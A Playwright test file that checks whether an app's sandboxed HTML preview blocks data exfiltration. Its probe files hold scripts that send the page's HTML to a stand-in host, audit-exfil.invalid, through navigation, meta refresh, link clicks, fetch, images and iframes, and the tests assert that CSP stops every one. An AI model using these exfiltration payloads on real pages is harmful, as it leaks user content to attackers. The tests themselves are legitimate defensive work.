import { expect, test } from './fixtures.ts';

test('an HTML preview cannot send its contents by navigating its own frame', async ({
  pairedPage: page,
  repo,
  previewRequests,
}) => {
  await repo.write(
    'preview-probe.html',
    '<!doctype html><html><body><h1>AUDIT_ONLY_CONTENT</h1><script>location.href = "https://audit-exfil.invalid/capture?d=" + encodeURIComponent(document.documentElement.outerHTML)</script></body></html>',
  );
  await page.getByRole('button', { name: 'Review', exact: true }).click();
  await page.getByRole('tab', { name: 'Files', exact: true }).click();
  await page
    .getByRole('treeitem', { name: 'preview-probe.html', exact: true })
    .click();
  await expect(
    page.getByLabel('preview-probe.html HTML preview', { exact: true }),
  ).toBeVisible();
  await expect
    .poll(() =>
      page
        .frames()
        .some(
          (frame) =>
            frame.parentFrame() !== null &&
            (frame.url().includes('audit-exfil') ||
              frame.url() === 'chrome-error://chromewebdata/'),
        ),
    )
    .toBe(true);
  await expect.poll(() => previewRequests.requests).toEqual([]);
  await expect
    .poll(() =>
      previewRequests.violations.some((message) =>
        message.includes("frame-src 'none'"),
      ),
    )
    .toBe(true);
});

for (const width of [1440, 414]) {
  test(`an HTML preview blocks navigation variants at ${width}px`, async ({
    pairedPage: page,
    repo,
    previewRequests,
  }) => {
    await page.setViewportSize({ width, height: 896 });
    const sameHost = `${new URL(page.url()).origin}/preview-capture`;
    const variants = [
      [
        'assign',
        'location.assign(destination)',
        'https://audit-exfil.invalid/capture',
      ],
      [
        'replace',
        'location.replace(destination)',
        'https://audit-exfil.invalid/capture',
      ],
      [
        'http',
        'location.href = destination',
        'http://audit-exfil.invalid/capture',
      ],
      ['same-host', 'location.href = destination', sameHost],
      [
        'link',
        'const link = document.createElement("a"); link.href = destination; document.body.append(link); link.click()',
        'https://audit-exfil.invalid/capture',
      ],
      [
        'refresh',
        'const meta = document.createElement("meta"); meta.httpEquiv = "refresh"; meta.content = "0;url=" + destination; document.head.append(meta)',
        'https://audit-exfil.invalid/capture',
      ],
    ];
    for (const [name, action, destination] of variants)
      await repo.write(
        `preview-${name}.html`,
        `<!doctype html><h1>AUDIT_ONLY_CONTENT</h1><script>const destination = ${JSON.stringify(destination)} + '?d=' + encodeURIComponent(document.documentElement.outerHTML); ${action}</script>`,
      );
    for (const [name] of variants) {
      const path = `preview-${name}.html`;
      await page.keyboard.press('Alt+1');
      await page.getByRole('treeitem', { name: path, exact: true }).click();
      await expect
        .poll(() =>
          page
            .frames()
            .some((frame) => frame.url() === 'chrome-error://chromewebdata/'),
        )
        .toBe(true);
      await expect.poll(() => previewRequests.requests).toEqual([]);
      await page.getByRole('tab', { name: 'Source', exact: true }).click();
      await expect(
        page.getByLabel(`${path} HTML preview`, { exact: true }),
      ).toHaveCount(0);
      await expect(page.getByText(/const destination =/)).toBeVisible();
    }
  });

  test(`an HTML preview keeps local interaction and blocks resources at ${width}px`, async ({
    pairedPage: page,
    app,
    repo,
    previewRequests,
  }, info) => {
    await page.setViewportSize({ width, height: 896 });
    await repo.write(
      'interaction.js',
      'document.getElementById("local").textContent = "Local script loaded";',
    );
    await repo.write(
      'interactive.html',
      `<!doctype html><h1>AUDIT_ONLY_CONTENT</h1><p id="local"></p><script src="interaction.js"></script><p id="parent"></p><p id="violations"></p><button onclick="this.textContent = 'Interaction works'">Try interaction</button><button onclick="fetch('https://audit-exfil.invalid/fetch').catch(() => {}); const image = new Image(); image.src = 'https://audit-exfil.invalid/image'; const frame = document.createElement('iframe'); frame.src = 'https://audit-exfil.invalid/frame'; document.body.append(frame)">Try network</button><script>console.log('AUDIT_ONLY_PREVIEW_EXECUTED'); try { parent.document.body; document.getElementById('parent').textContent = 'Parent exposed'; } catch { document.getElementById('parent').textContent = 'Parent isolated'; } document.addEventListener('securitypolicyviolation', event => { document.getElementById('violations').textContent += event.effectiveDirective + ' '; });</script>`,
    );
    await page.keyboard.press('Alt+1');
    await page
      .getByRole('treeitem', { name: 'interactive.html', exact: true })
      .click();
    const preview = page
      .getByLabel('interactive.html HTML preview', { exact: true })
      .contentFrame()
      .getByLabel('Preview content', { exact: true })
      .contentFrame();
    await expect(
      preview.getByText('Local script loaded', { exact: true }),
    ).toBeVisible();
    await expect(
      preview.getByText('Parent isolated', { exact: true }),
    ).toBeVisible();
    await preview
      .getByRole('button', { name: 'Try interaction', exact: true })
      .click();
    await expect(
      preview.getByRole('button', { name: 'Interaction works', exact: true }),
    ).toBeVisible();
    for (const colorScheme of ['dark', 'light'] as const) {
      await page.emulateMedia({ colorScheme });
      await expect
        .poll(() => app.previewColorScheme('interactive.html'))
        .toContain(`color-scheme: ${colorScheme}`);
      await expect(
        preview.getByRole('button', { name: 'Interaction works', exact: true }),
      ).toBeVisible();
      await expect.poll(() => previewRequests.executions.length).toBe(1);
    }
    await preview
      .getByRole('button', { name: 'Try network', exact: true })
      .click();
    for (const directive of ['connect-src', 'img-src', 'frame-src'])
      await expect(preview.getByText(new RegExp(directive))).toBeVisible();
    await expect.poll(() => previewRequests.requests).toEqual([]);
    await expect.poll(() => previewRequests.executions.length).toBe(1);
    await page.screenshot({
      path: info.outputPath(`interactive-${width}.png`),
    });
    await page.getByRole('tab', { name: 'Source', exact: true }).click();
    await expect(
      page.getByLabel('interactive.html HTML preview', { exact: true }),
    ).toHaveCount(0);
    await expect(page.getByText(/AUDIT_ONLY_PREVIEW_EXECUTED/)).toBeVisible();
    await expect.poll(() => previewRequests.executions.length).toBe(1);
    await page.getByRole('tab', { name: 'Preview', exact: true }).click();
    await expect(
      preview.getByRole('button', { name: 'Try interaction', exact: true }),
    ).toBeVisible();
    await expect.poll(() => previewRequests.executions.length).toBe(2);
    await expect.poll(() => previewRequests.requests).toEqual([]);
  });
}
